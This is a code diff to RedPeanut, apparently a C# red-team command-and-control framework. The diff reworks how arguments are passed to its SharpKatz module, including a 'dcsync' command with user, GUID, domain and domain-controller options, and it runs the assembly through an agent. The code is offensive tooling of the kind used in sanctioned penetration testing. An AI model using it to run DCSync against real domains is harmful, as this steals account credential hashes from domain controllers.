@@ -128,32 +128,39 @@ namespace RedPeanut
                     return;
                 }
 
-                args.Add("--Command " + command);
+                args.Add("--Command");
+                args.Add(command);
 
-                if(command.Equals("dcsync"))
+                if (command.Equals("dcsync"))
                 {
                    
                     if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(guid) || !string.IsNullOrEmpty(domain))
                     {
                         if (!string.IsNullOrEmpty(guid))
                         {
-                            args.Add("--Guid " + guid);
-                        }else if (!string.IsNullOrEmpty(username))
+                            args.Add("--Guid");
+                            args.Add(guid);
+                        }
+                        else if (!string.IsNullOrEmpty(username))
                         {
-                            args.Add("--User " + username);
+                            args.Add("--User");
+                            args.Add(username);
                         }
 
                         if (!string.IsNullOrEmpty(domain))
                         {
-                            args.Add("--Domain " + domain);
+                            args.Add("--Domain");
+                            args.Add(domain);
                         }
                         if (!string.IsNullOrEmpty(domaincontroller))
                         {
-                            args.Add("--DomainController " + domaincontroller);
+                            args.Add("--DomainController");
+                            args.Add(domaincontroller);
                         }
                         if (!string.IsNullOrEmpty(altservice))
                         {
-                            args.Add("--Altservice " + altservice);
+                            args.Add("--Altservice");
+                            args.Add(altservice);
                         }
                     }
                     else
@@ -163,9 +170,13 @@ namespace RedPeanut
 
                 }
 
+                RunAssembly(PL_MODULE_SHARPKATZ, "SharpKatz.Program", args.ToArray<string>(), agent);
+            }
+            else
+            {
+                Console.WriteLine("You must specify command parameter");
             }
 
-            RunAssembly(PL_MODULE_SHARPKATZ, "SharpKatz.Program", args.ToArray<string>(), agent);
 
         }
 
